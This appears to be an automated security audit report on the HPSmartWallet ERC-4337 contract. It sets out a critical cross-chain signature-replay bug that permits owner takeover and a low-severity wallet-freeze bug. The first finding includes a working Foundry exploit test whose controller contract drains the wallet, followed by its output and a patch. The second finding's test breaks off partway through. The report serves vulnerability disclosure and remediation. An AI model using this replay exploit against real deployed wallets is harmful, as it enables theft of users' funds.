# Audited by [V12](https://v12.sh/)

The only autonomous auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

# Replayable Address Owner Takeover
**#85741**
- Severity: Critical
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPSmartWallet.sol` (5 locations)
#### Lines 215-229 — _Replayable user operations are rehashed without chain ID when the call targets `executeWithoutChainIdValidation`._

```
    function validateUserOp(UserOperation06 calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)
        external
        virtual
        onlyEntryPoint
        payPrefund(missingAccountFunds)
        returns (uint256 validationData)
    {
        uint256 key = userOp.nonce >> 64;

        if (bytes4(userOp.callData) == this.executeWithoutChainIdValidation.selector) {
            // Chain-agnostic replay path: gated to the replayable nonce key and to the owner-management
            // selectors in `canSkipChainIdValidation` (which deliberately excludes `upgradeToAndCall`, so
            // upgrades stay chain-bound and cannot be replayed onto another chain).
            userOpHash = getUserOpHashWithoutChainId(userOp);
            if (key != REPLAYABLE_NONCE_KEY) {
```

⋯
#### Lines 245-253 — _The replayable entry point executes allowed self-calls after selector-only filtering._

```
    function executeWithoutChainIdValidation(bytes[] calldata calls) external payable virtual onlyEntryPoint {
        for (uint256 i; i < calls.length; i++) {
            bytes calldata call = calls[i];
            bytes4 selector = bytes4(call);
            if (!canSkipChainIdValidation(selector)) {
                revert SelectorNotAllowed(selector);
            }

            _call(address(this), 0, call);
```

⋯
#### Lines 257-263 — _Stored owner addresses can call `execute()` and perform arbitrary wallet calls._

```
    function execute(address target, uint256 value, bytes calldata data)
        external
        payable
        virtual
        onlyEntryPointOrOwner
    {
        _call(target, value, data);
```

⋯
#### Lines 276-278 — _The chain-agnostic hash binds only the inner user operation hash and EntryPoint address._

```
    function getUserOpHashWithoutChainId(UserOperation06 calldata userOp) public view virtual returns (bytes32) {
        return keccak256(abi.encode(UserOperation06Hash.hash(userOp), entryPoint()));
    }
```

⋯
#### Lines 286-294 — _`addOwnerAddress` is explicitly allowed on the chain-agnostic replay path._

```
    /// @notice Selectors permitted on the chain-agnostic replay path. Owner management only — `upgradeToAndCall`
    ///         is intentionally excluded so an upgrade signed for one chain cannot be replayed onto another where
    ///         the same implementation address may hold different code.
    function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
        if (
            functionSelector == MultiOwnable.addOwnerPublicKey.selector
                || functionSelector == MultiOwnable.addOwnerAddress.selector
                || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
        ) {
```

### `contracts/src/wallets/base/MultiOwnable.sol` (2 locations)
#### Lines 42-47 — _Address owners are added as raw ABI-encoded addresses._

```
    function addOwnerAddress(address owner) external virtual onlyOwner {
        _addOwnerAtIndex(abi.encode(owner), _getMultiOwnableStorage().nextOwnerIndex++);
    }

    function addOwnerPublicKey(bytes32 x, bytes32 y) external virtual onlyOwner {
        _addOwnerAtIndex(abi.encode(x, y), _getMultiOwnableStorage().nextOwnerIndex++);
```

⋯
#### Lines 134-139 — _Any stored owner address is accepted as a direct caller._

```
    function _checkOwner() internal view virtual {
        if (isOwnerAddress(msg.sender) || (msg.sender == address(this))) {
            return;
        }

        revert Unauthorized();
```

### `contracts/src/wallets/libraries/OwnerValidation.sol`
#### Lines 22-28 — _Address-owner validation checks only nonzero uint160 shape, not EOA status or code identity._

```
    function validate(bytes memory owner) internal pure {
        if (owner.length == 32) {
            uint256 value = uint256(bytes32(owner));
            if (value == 0 || value > type(uint160).max) {
                revert InvalidEthereumAddressOwner(owner);
            }
            return;
```

## Description

`HPSmartWallet` intentionally rewrites the signed ERC-4337 hash to `getUserOpHashWithoutChainId()` for `executeWithoutChainIdValidation`, and that hash contains only the inner user operation hash plus `entryPoint()` and omits `block.chainid`. The replayable path permits `MultiOwnable.addOwnerAddress`, then executes the encoded self-call on the wallet after only checking the four-byte selector. `addOwnerAddress` stores any nonzero 160-bit address owner, and the wallet later treats that address as fully privileged because `execute()` is gated by `onlyEntryPointOrOwner` and `MultiOwnable._checkOwner()` accepts `msg.sender` equal to any stored owner address. This means a signature that adds an address owner on one chain also authorizes adding the same raw address on every other chain, even if that address is a different smart contract or a contract controlled by a different party on the target chain. An attacker can deploy or select a benign controller at address `C` on the source chain and a malicious controller at the same address `C` on another chain, obtain or observe the owner's replayable add-owner user operation for `C`, replay it on the target chain, and then call `execute()` from the malicious `C` to drain the wallet there.

## Root cause

The replayable authorization path binds signatures to a raw address owner but not to the chain or to the owner's code identity. `addOwnerAddress` accepts smart-contract addresses as owners while `getUserOpHashWithoutChainId()` deliberately removes the chain-domain separation that would distinguish those addresses across chains.

## Impact

The attacker gains owner-equivalent control of the victim wallet on the replay target chain. From that owner position, the attacker can execute arbitrary calls and transfer all ETH, ERC-20s, and NFTs held by the wallet on that chain.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";

import { HPSmartWallet } from "@src/wallets/HPSmartWallet.sol";
import { MultiOwnable } from "@src/wallets/base/MultiOwnable.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

contract ChainScopedController {
    error NotOperator();

    address public operator;

    constructor(address sourceOperator, address targetOperator, uint256 targetChainId) {
        operator = block.chainid == targetChainId ? targetOperator : sourceOperator;
    }

    function drain(HPSmartWallet wallet, address recipient) external {
        if (msg.sender != operator) revert NotOperator();
        wallet.execute(recipient, address(wallet).balance, "");
    }
}

contract WalletHarnessPlaceholderTest is WalletTestBase {
    function test_replayableAddOwnerSignature_replaysOntoDifferentChainController() public {
        uint256 sourceChainId = 1;
        uint256 targetChainId = 10;
        address benignOperator = makeAddr("benignOperator");
        address attacker = makeAddr("attacker");
        address attackerRecipient = makeAddr("attackerRecipient");

        uint256 baseSnapshot = vm.snapshotState();

        vm.chainId(sourceChainId);
        ChainScopedController sourceController =
            new ChainScopedController(benignOperator, attacker, targetChainId);
        HPSmartWallet sourceWallet = _createWallet(ownerEOA, 0);
        vm.deal(address(sourceWallet), 1 ether);

        bytes[] memory sourceCalls = new bytes[](1);
        sourceCalls[0] = abi.encodeCall(MultiOwnable.addOwnerAddress, (address(sourceController)));

        UserOperation06 memory sourceOp =
            _baseUserOp(address(sourceWallet), sourceWallet.REPLAYABLE_NONCE_KEY() << 64);
        sourceOp.callData = abi.encodeCall(HPSmartWallet.executeWithoutChainIdValidation, (sourceCalls));

        bytes32 sourceDigest = sourceWallet.getUserOpHashWithoutChainId(sourceOp);
        sourceOp.signature = _eoaSignature(ownerPk, sourceDigest, 0);

        assertEq(sourceController.operator(), benignOperator);

        vm.prank(entryPointAddr);
        assertEq(sourceWallet.validateUserOp(sourceOp, keccak256("ignored"), 0), 0);

        vm.prank(entryPointAddr);
        sourceWallet.executeWithoutChainIdValidation(sourceCalls);

        assertTrue(sourceWallet.isOwnerAddress(address(sourceController)));

        vm.prank(attacker);
        vm.expectRevert(ChainScopedController.NotOperator.selector);
        sourceController.drain(sourceWallet, attackerRecipient);

        assertTrue(vm.revertToState(baseSnapshot));

        vm.chainId(targetChainId);
        ChainScopedController targetController =
            new ChainScopedController(benignOperator, attacker, targetChainId);
        HPSmartWallet targetWallet = _createWallet(ownerEOA, 0);
        vm.deal(address(targetWallet), 1 ether);

        assertEq(address(targetController), address(sourceController));
        assertEq(address(targetWallet), address(sourceWallet));
        assertEq(targetController.operator(), attacker);

        bytes[] memory targetCalls = new bytes[](1);
        targetCalls[0] = abi.encodeCall(MultiOwnable.addOwnerAddress, (address(targetController)));

        UserOperation06 memory targetOp =
            _baseUserOp(address(targetWallet), targetWallet.REPLAYABLE_NONCE_KEY() << 64);
        targetOp.callData = abi.encodeCall(HPSmartWallet.executeWithoutChainIdValidation, (targetCalls));

        bytes32 targetDigest = targetWallet.getUserOpHashWithoutChainId(targetOp);
        assertEq(targetDigest, sourceDigest);

        targetOp.signature = sourceOp.signature;

        vm.prank(entryPointAddr);
        assertEq(targetWallet.validateUserOp(targetOp, keccak256("ignored"), 0), 0);

        vm.prank(entryPointAddr);
        targetWallet.executeWithoutChainIdValidation(targetCalls);

        assertTrue(targetWallet.isOwnerAddress(address(targetController)));

        uint256 recipientBalanceBefore = attackerRecipient.balance;

        vm.prank(attacker);
        targetController.drain(targetWallet, attackerRecipient);

        assertEq(attackerRecipient.balance, recipientBalanceBefore + 1 ether);
        assertEq(address(targetWallet).balance, 0);
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd /repo/contracts && rm -rf out cache && forge build
```

### Output

```
[output truncated: 24 lines & 0.9990234375 KB skipped]
84 |     modifier notDelegated() virtual {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[PASS] test_replayableAddOwnerSignature_replaysOntoDifferentChainController() (gas: 1045364)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.33ms (2.49ms CPU time)

Ran 1 test suite in 11.28ms (4.33ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

PoC validated on the existing Foundry wallet harness by simulating source and target chains with `vm.chainId` plus snapshot/revert so the same factory/controller deployment sequence yields identical addresses on both branches. It demonstrates replay of the same signed `executeWithoutChainIdValidation(addOwnerAddress(controller))` user operation onto a different chain ID and subsequent direct owner-authorized drain through the target-chain controller contract at that replayed address. It does not model live cross-network message capture or bundler inclusion; those are inferred from the verified chain-agnostic hash reuse and successful target-chain execution.

## Remediation

### Explanation

Removed MultiOwnable.addOwnerAddress from the chain-agnostic replay allowlist so replayable user operations can no longer add raw address owners whose controller/code may differ across chains; public-key owner management and removals remain replayable.

### Patch

```diff
diff --git a/contracts/src/wallets/HPSmartWallet.sol b/contracts/src/wallets/HPSmartWallet.sol
--- a/contracts/src/wallets/HPSmartWallet.sol
+++ b/contracts/src/wallets/HPSmartWallet.sol
@@ -1,383 +1,384 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { IAccount06 } from "@account-abstraction/legacy/v06/IAccount06.sol";
 import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";
 import { Receiver } from "@solady/accounts/Receiver.sol";
 import { SignatureCheckerLib } from "@solady/utils/SignatureCheckerLib.sol";
 import { UUPSUpgradeable } from "@solady/utils/UUPSUpgradeable.sol";
 import { WebAuthn } from "@webauthn-sol/WebAuthn.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { DefaultCrypto, DefaultStablecoin } from "./types/HPWalletTypes.sol";
 import { MultiOwnable } from "./base/MultiOwnable.sol";
 import { UserOperation06Hash } from "./base/UserOperation06Hash.sol";
 import { WalletERC1271 } from "./base/WalletERC1271.sol";
 
 /// @notice Storage layout used by this contract.
 /// @custom:storage-location erc7201:highpotential.storage.WalletSettings
 struct WalletSettingsStorage {
     DefaultCrypto defaultCrypto;
     DefaultStablecoin defaultStablecoin;
 }
 
 /// @notice User-specific manager contracts, co-located in the wallet (authoritative; no central registry).
 /// @dev Read by the frontend in a single `eth_call` via `accountSet()`. Populated by an owner post-creation
 ///      (or by a future factory orchestration self-call once PositionManager/VaultManager are designed); not an
 ///      `initialize` arg, so it cannot influence the counterfactual address.
 /// @custom:storage-location erc7201:highpotential.storage.AccountSet
 struct AccountSetStorage {
     address positionManager;
     address vaultManager;
 }
 
 /// @title HPSmartWallet
 /// @notice ERC-4337 v0.6 smart account modeled on Coinbase Smart Wallet: multi-owner (EOA + passkey), ERC-1271, UUPS.
 /// @dev Extends the base account with user settings (DefaultCrypto / DefaultStablecoin) and the user's AccountSet
 ///      (PositionManager / VaultManager) in ERC-7201 namespaced storage, plus AddressProvider-based token
 ///      resolution. Owner -> wallet discovery is handled off-chain by Turnkey; legitimacy is asserted by the
 ///      factory's `isHPWallet` flag. EntryPoint v0.6 default below; override `entryPoint()` per-chain if needed.
 contract HPSmartWallet is WalletERC1271, IAccount06, MultiOwnable, UUPSUpgradeable, Receiver, AddressBook {
     struct SignatureWrapper {
         uint256 ownerIndex;
         bytes signatureData;
     }
 
     struct Call {
         address target;
         uint256 value;
         bytes data;
     }
 
     /// @dev Upper 192 bits of `UserOperation.nonce` for `executeWithoutChainIdValidation` (Coinbase uses Base chain id).
     uint256 public constant REPLAYABLE_NONCE_KEY = 8453;
 
     /// @dev keccak256(abi.encode(uint256(keccak256("highpotential.storage.WalletSettings")) - 1)) & ~bytes32(uint256(0xff))
     bytes32 private constant _WALLET_SETTINGS_STORAGE_LOCATION =
         0xde9abc39f8ba6496385be7b2e06f782787ee07b9096c13bc6574d61d02346900;
     /// @dev keccak256(abi.encode(uint256(keccak256("highpotential.storage.AccountSet")) - 1)) & ~bytes32(uint256(0xff))
     bytes32 private constant _ACCOUNT_SET_STORAGE_LOCATION =
         0xd2d10004138f2882870e52b168c3ad025ba8daea9d7df73d3caa86e3d34a7b00;
 
     event DefaultCryptoUpdated(DefaultCrypto indexed previous, DefaultCrypto indexed current);
     event DefaultStablecoinUpdated(DefaultStablecoin indexed previous, DefaultStablecoin indexed current);
     event AccountSetUpdated(address indexed positionManager, address indexed vaultManager);
 
     error Initialized();
     error SelectorNotAllowed(bytes4 selector);
     error InvalidNonceKey(uint256 key);
 
     modifier onlyEntryPoint() {
         if (msg.sender != entryPoint()) {
             revert Unauthorized();
         }
 
         _;
     }
 
     modifier onlyEntryPointOrOwner() {
         if (msg.sender != entryPoint()) {
             _checkOwner();
         }
 
         _;
     }
 
     modifier payPrefund(uint256 missingAccountFunds) {
         _;
 
         assembly ("memory-safe") {
             if missingAccountFunds {
                 pop(call(gas(), caller(), missingAccountFunds, codesize(), 0x00, codesize(), 0x00))
             }
         }
     }
 
     constructor(address addressProvider_) AddressBook(addressProvider_) {
         // Lock this implementation against direct initialization. Done without storing an `address(0)` sentinel
         // owner, which would now be rejected as uncontrollable; proxies retain fresh storage and initialize.
         _lockImplementation();
     }
 
     function initialize(bytes[] calldata owners) external payable virtual {
         if (nextOwnerIndex() != 0) {
             revert Initialized();
         }
 
         _initializeOwners(owners);
 
         // Seed user settings to platform defaults (mirrors the UI defaults); the user can update them post-creation.
         // Deliberately not initializer args: the counterfactual address must depend only on owners + nonce, and a
         // front-runner of `createAccount` must not be able to influence wallet state.
         // Previous values are the enum zero values (BTC / TGBP) — the actual pre-init state — so off-chain
         // indexers reconstructing preference history see the correct transition.
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         $.defaultCrypto = DefaultCrypto.ETH;
         $.defaultStablecoin = DefaultStablecoin.TGBP;
         emit DefaultCryptoUpdated(DefaultCrypto.BTC, DefaultCrypto.ETH);
         emit DefaultStablecoinUpdated(DefaultStablecoin.TGBP, DefaultStablecoin.TGBP);
     }
 
     // --------------------------------------------
     //  User settings
     // --------------------------------------------
 
     /// @notice Updates the preferred crypto asset. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultCrypto(DefaultCrypto newDefaultCrypto) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultCrypto previous = $.defaultCrypto;
         $.defaultCrypto = newDefaultCrypto;
         emit DefaultCryptoUpdated(previous, newDefaultCrypto);
     }
 
     /// @notice Updates the preferred stablecoin. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultStablecoin(DefaultStablecoin newDefaultStablecoin) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultStablecoin previous = $.defaultStablecoin;
         $.defaultStablecoin = newDefaultStablecoin;
         emit DefaultStablecoinUpdated(previous, newDefaultStablecoin);
     }
 
     function defaultCrypto() public view virtual returns (DefaultCrypto) {
         return _getWalletSettingsStorage().defaultCrypto;
     }
 
     function defaultStablecoin() public view virtual returns (DefaultStablecoin) {
         return _getWalletSettingsStorage().defaultStablecoin;
     }
 
     /// @notice Both settings in a single call (one cheap read for the UI).
     function walletSettings() external view virtual returns (DefaultCrypto, DefaultStablecoin) {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         return ($.defaultCrypto, $.defaultStablecoin);
     }
 
     /// @notice Token address for the preferred crypto, resolved via `AddressProvider`.
     /// @dev Reverts `AddressNotFound` while the key is unset (e.g. SETH before its wrapper is deployed).
     function defaultCryptoAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_cryptoKeyName(defaultCrypto())));
     }
 
     /// @notice Token address for the preferred stablecoin, resolved via `AddressProvider`.
     function defaultStablecoinAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_stablecoinKeyName(defaultStablecoin())));
     }
 
     function _cryptoKeyName(DefaultCrypto crypto) internal pure returns (string memory) {
         if (crypto == DefaultCrypto.BTC) return "CBBTC";
         if (crypto == DefaultCrypto.ETH) return "WETH";
         return "SETH";
     }
 
     function _stablecoinKeyName(DefaultStablecoin stablecoin) internal pure returns (string memory) {
         if (stablecoin == DefaultStablecoin.TGBP) return "TGBP";
         if (stablecoin == DefaultStablecoin.USDC) return "USDC";
         if (stablecoin == DefaultStablecoin.EURC) return "EURC";
         return "DAI";
     }
 
     function _getWalletSettingsStorage() internal pure returns (WalletSettingsStorage storage $) {
         assembly ("memory-safe") {
             $.slot := _WALLET_SETTINGS_STORAGE_LOCATION
         }
     }
 
     // --------------------------------------------
     //  Account set (user-specific managers)
     // --------------------------------------------
 
     /// @notice The user's PositionManager and VaultManager, in a single cheap read for the UI.
     function accountSet() external view virtual returns (address positionManager, address vaultManager) {
         AccountSetStorage storage $ = _getAccountSetStorage();
         return ($.positionManager, $.vaultManager);
     }
 
     /// @notice Sets the user's manager contracts. Callable by an owner directly or via EntryPoint `execute`
     ///         self-call.
     function setAccountSet(address positionManager, address vaultManager) external virtual onlyOwner {
         AccountSetStorage storage $ = _getAccountSetStorage();
         $.positionManager = positionManager;
         $.vaultManager = vaultManager;
         emit AccountSetUpdated(positionManager, vaultManager);
     }
 
     function _getAccountSetStorage() internal pure returns (AccountSetStorage storage $) {
         assembly ("memory-safe") {
             $.slot := _ACCOUNT_SET_STORAGE_LOCATION
         }
     }
 
     // --------------------------------------------
     //  ERC-4337
     // --------------------------------------------
 
     function validateUserOp(UserOperation06 calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)
         external
         virtual
         onlyEntryPoint
         payPrefund(missingAccountFunds)
         returns (uint256 validationData)
     {
         uint256 key = userOp.nonce >> 64;
 
         if (bytes4(userOp.callData) == this.executeWithoutChainIdValidation.selector) {
             // Chain-agnostic replay path: gated to the replayable nonce key and to the owner-management
             // selectors in `canSkipChainIdValidation` (which deliberately excludes `upgradeToAndCall`, so
             // upgrades stay chain-bound and cannot be replayed onto another chain).
             userOpHash = getUserOpHashWithoutChainId(userOp);
             if (key != REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
         } else {
             if (key == REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
         }
 
         if (_isValidSignature(userOpHash, userOp.signature)) {
             return 0;
         }
 
         return 1;
     }
 
     function executeWithoutChainIdValidation(bytes[] calldata calls) external payable virtual onlyEntryPoint {
         for (uint256 i; i < calls.length; i++) {
             bytes calldata call = calls[i];
             bytes4 selector = bytes4(call);
             if (!canSkipChainIdValidation(selector)) {
                 revert SelectorNotAllowed(selector);
             }
 
             _call(address(this), 0, call);
         }
     }
 
     function execute(address target, uint256 value, bytes calldata data)
         external
         payable
         virtual
         onlyEntryPointOrOwner
     {
         _call(target, value, data);
     }
 
     function executeBatch(Call[] calldata calls) external payable virtual onlyEntryPointOrOwner {
         for (uint256 i; i < calls.length; i++) {
             _call(calls[i].target, calls[i].value, calls[i].data);
         }
     }
 
     function entryPoint() public view virtual returns (address) {
         return 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
     }
 
     function getUserOpHashWithoutChainId(UserOperation06 calldata userOp) public view virtual returns (bytes32) {
         return keccak256(abi.encode(UserOperation06Hash.hash(userOp), entryPoint()));
     }
 
     function implementation() public view returns (address $) {
         assembly ("memory-safe") {
             $ := sload(_ERC1967_IMPLEMENTATION_SLOT)
         }
     }
 
-    /// @notice Selectors permitted on the chain-agnostic replay path. Owner management only — `upgradeToAndCall`
-    ///         is intentionally excluded so an upgrade signed for one chain cannot be replayed onto another where
-    ///         the same implementation address may hold different code.
+    /// @notice Selectors permitted on the chain-agnostic replay path. Public-key owner management only plus
+    ///         owner removal — raw address owners stay chain-bound because the same address may resolve to a
+    ///         different controller or contract code on another chain. `upgradeToAndCall` is intentionally
+    ///         excluded so an upgrade signed for one chain cannot be replayed onto another where the same
+    ///         implementation address may hold different code.
     function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
         if (
             functionSelector == MultiOwnable.addOwnerPublicKey.selector
-                || functionSelector == MultiOwnable.addOwnerAddress.selector
                 || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
         ) {
             return true;
         }
         return false;
     }
 
     function _call(address target, uint256 value, bytes memory data) internal {
         (bool success, bytes memory result) = target.call{ value: value }(data);
         if (!success) {
             assembly ("memory-safe") {
                 revert(add(result, 32), mload(result))
             }
         }
     }
 
     /// @notice ERC-1271 verification that always returns a selector, never reverts.
     /// @dev Routes signature parsing through a self-`staticcall` so malformed signature blobs, stale/out-of-range
     ///      owner indices, and malformed WebAuthn payloads surface as `0xffffffff` rather than a revert, honoring
     ///      the ERC-1271 contract that failure is reported via the return value.
     function isValidSignature(bytes32 hash, bytes calldata signature)
         public
         view
         virtual
         override
         returns (bytes4)
     {
         try this.isValidSignatureExternal(replaySafeHash(hash), signature) returns (bool ok) {
             return ok ? bytes4(0x1626ba7e) : bytes4(0xffffffff);
         } catch {
             return 0xffffffff;
         }
     }
 
     /// @notice Self-only external wrapper enabling the `try/catch` in `isValidSignature`.
     /// @dev `replaySafeHash` is already applied by the caller; do not re-wrap.
     function isValidSignatureExternal(bytes32 replaySafeHash_, bytes calldata signature)
         external
         view
         virtual
         returns (bool)
     {
         if (msg.sender != address(this)) revert Unauthorized();
         return _isValidSignature(replaySafeHash_, signature);
     }
 
     function _isValidSignature(bytes32 hash, bytes calldata signature)
         internal
         view
         virtual
         override
         returns (bool)
     {
         SignatureWrapper memory sigWrapper = abi.decode(signature, (SignatureWrapper));
         bytes memory ownerBytes = ownerAtIndex(sigWrapper.ownerIndex);
 
         // Out-of-range or removed owner index: report failure rather than reverting.
         if (ownerBytes.length == 0) {
             return false;
         }
 
         if (ownerBytes.length == 32) {
             if (uint256(bytes32(ownerBytes)) > type(uint160).max) {
                 revert InvalidEthereumAddressOwner(ownerBytes);
             }
 
             address ownerAddr;
             assembly ("memory-safe") {
                 ownerAddr := mload(add(ownerBytes, 32))
             }
 
             return SignatureCheckerLib.isValidSignatureNow(ownerAddr, hash, sigWrapper.signatureData);
         }
 
         if (ownerBytes.length == 64) {
             (uint256 x, uint256 y) = abi.decode(ownerBytes, (uint256, uint256));
 
             WebAuthn.WebAuthnAuth memory auth = abi.decode(sigWrapper.signatureData, (WebAuthn.WebAuthnAuth));
 
             return WebAuthn.verify({ challenge: abi.encode(hash), requireUV: false, webAuthnAuth: auth, x: x, y: y });
         }
 
         revert InvalidOwnerBytesLength(ownerBytes);
     }
 
     function _authorizeUpgrade(address) internal view virtual override(UUPSUpgradeable) onlyOwner { }
 
     function _domainNameAndVersion() internal pure override(WalletERC1271) returns (string memory, string memory) {
         return ("HighPotential Smart Wallet", "1");
     }
 }
```

### Affected files
- `contracts/src/wallets/HPSmartWallet.sol`

### Validation output

```
[output truncated: 33 lines & 1.5126953125 KB skipped]

Failing tests:
Encountered 1 failing test in test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[FAIL: SelectorNotAllowed(0x0f0f3f24)] test_replayableAddOwnerSignature_replaysOntoDifferentChainController() (gas: 430880)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

---

# Unreachable Owner Can Freeze Wallet
**#85742**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/base/MultiOwnable.sol` (5 locations)
#### Lines 42-48 — _Owner-only entrypoints add address and public-key owners through the shared storage chokepoint._

```
    function addOwnerAddress(address owner) external virtual onlyOwner {
        _addOwnerAtIndex(abi.encode(owner), _getMultiOwnableStorage().nextOwnerIndex++);
    }

    function addOwnerPublicKey(bytes32 x, bytes32 y) external virtual onlyOwner {
        _addOwnerAtIndex(abi.encode(x, y), _getMultiOwnableStorage().nextOwnerIndex++);
    }
```

⋯
#### Lines 50-58 — _Removal blocks only the final stored owner record._

```
    /// @notice Removes an owner. The final owner can never be removed, so the wallet always has >=1 controller.
    /// @dev `removeLastOwner` (which the Coinbase base exposes) is intentionally omitted: allowing the owner set
    ///      to reach zero would permanently brick `execute`, owner management, and upgrades.
    function removeOwnerAtIndex(uint256 index, bytes calldata owner) external virtual onlyOwner {
        if (ownerCount() == 1) {
            revert LastOwner();
        }

        _removeOwnerAtIndex(index, owner);
```

⋯
#### Lines 81-83 — _`ownerCount()` is a raw stored-record count._

```
    function ownerCount() public view virtual returns (uint256) {
        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        return $.nextOwnerIndex - $.removedOwnersCount;
```

⋯
#### Lines 99-109 — _Owner storage rejects invalid bytes, self-owner, and duplicates, but not non-authorizing addresses._

```
    /// @dev Single chokepoint for all owner writes (initialize / addOwnerAddress / addOwnerPublicKey). Rejects
    ///      uncontrollable owners so the stored set always equals the set of reachable controllers.
    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual {
        OwnerValidation.validate(owner);
        if (keccak256(owner) == keccak256(abi.encode(address(this)))) revert SelfOwnerNotAllowed();
        if (isOwnerBytes(owner)) revert AlreadyOwner(owner);

        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        $.isOwner[owner] = true;
        $.ownerAtIndex[index] = owner;

```

⋯
#### Lines 134-140 — _Direct authorization requires the caller to be the stored owner address or the wallet itself._

```
    function _checkOwner() internal view virtual {
        if (isOwnerAddress(msg.sender) || (msg.sender == address(this))) {
            return;
        }

        revert Unauthorized();
    }
```

### `contracts/src/wallets/libraries/OwnerValidation.sol`
#### Lines 19-29 — _Address owner validation only checks nonzero `uint160`-range encoding._

```
    /// @notice Reverts unless `owner` encodes a controllable owner.
    /// @dev 32 bytes: a non-zero EOA address within the uint160 range. 64 bytes: a secp256r1 public key whose
    ///      `(x, y)` lies on the curve (`ecAff_isOnCurve` also rejects `(0, 0)` and out-of-field coordinates).
    function validate(bytes memory owner) internal pure {
        if (owner.length == 32) {
            uint256 value = uint256(bytes32(owner));
            if (value == 0 || value > type(uint160).max) {
                revert InvalidEthereumAddressOwner(owner);
            }
            return;
        }
```

### `contracts/src/wallets/HPSmartWallet.sol`
#### Lines 339-365 — _Address-owner signature authorization is checked against the stored owner address._

```
    function _isValidSignature(bytes32 hash, bytes calldata signature)
        internal
        view
        virtual
        override
        returns (bool)
    {
        SignatureWrapper memory sigWrapper = abi.decode(signature, (SignatureWrapper));
        bytes memory ownerBytes = ownerAtIndex(sigWrapper.ownerIndex);

        // Out-of-range or removed owner index: report failure rather than reverting.
        if (ownerBytes.length == 0) {
            return false;
        }

        if (ownerBytes.length == 32) {
            if (uint256(bytes32(ownerBytes)) > type(uint160).max) {
                revert InvalidEthereumAddressOwner(ownerBytes);
            }

            address ownerAddr;
            assembly ("memory-safe") {
                ownerAddr := mload(add(ownerBytes, 32))
            }

            return SignatureCheckerLib.isValidSignatureNow(ownerAddr, hash, sigWrapper.signatureData);
        }
```

### `contracts/lib/solady/src/utils/SignatureCheckerLib.sol`
#### Lines 29-37 — _Address signatures only succeed through ECDSA for code-less signers or ERC-1271 for contract signers._

```
    /// @dev Returns whether `signature` is valid for `signer` and `hash`.
    /// If `signer.code.length == 0`, then validate with `ecrecover`, else
    /// it will validate with ERC1271 on `signer`.
    function isValidSignatureNow(address signer, bytes32 hash, bytes memory signature)
        internal
        view
        returns (bool isValid)
    {
        if (signer == address(0)) return isValid;
```

## Description

`MultiOwnable` still allows an owner entry that is syntactically an address but has no authorization path to be stored as a real controller. `OwnerValidation.validate()` only requires a 32-byte owner payload to be nonzero and within the `uint160` address range, and `_addOwnerAtIndex()` then rejects only the wallet’s own address and duplicates before marking it in `isOwner`. A current owner can add a non-authorizing contract or otherwise unreachable address, then call `removeOwnerAtIndex()` for the last reachable owner because the guard only checks the raw `ownerCount()`. After that transition, the wallet contains one stored owner, but `_checkOwner()` requires calls from that stored address and signature validation requires a valid ECDSA/ERC-1271 result for that same stored address. The final-owner invariant therefore protects the number of stored records, not the number of usable controllers.

## Root cause

The owner insertion path treats syntactic address validity as controllability. The final-owner guard then counts stored owner records instead of controllers that can actually satisfy `_checkOwner()` or signature validation.

## Impact

A malicious or compromised existing owner can permanently freeze wallet assets and administration by leaving only an unreachable owner record. This blocks future owner management, execution, and upgrades unless the remaining address unexpectedly has a working direct-call or signature path.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";

import { HPSmartWallet } from "@src/wallets/HPSmartWallet.sol";
import { MultiOwnable } from "@src/wallets/base/MultiOwnable.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

contract DeadOwnerContract { }

contract WalletHarnessPlaceholderTest is WalletTestBase {
    function test_reachableOwnerCanFreezeWalletByLeavingOnlyUnreachableContractOwner() public {
        HPSmartWallet wallet = _createWallet(ownerEOA, 0);
        DeadOwnerContract deadOwner = new DeadOwnerContract();
        address recipient = makeAddr("recipient");
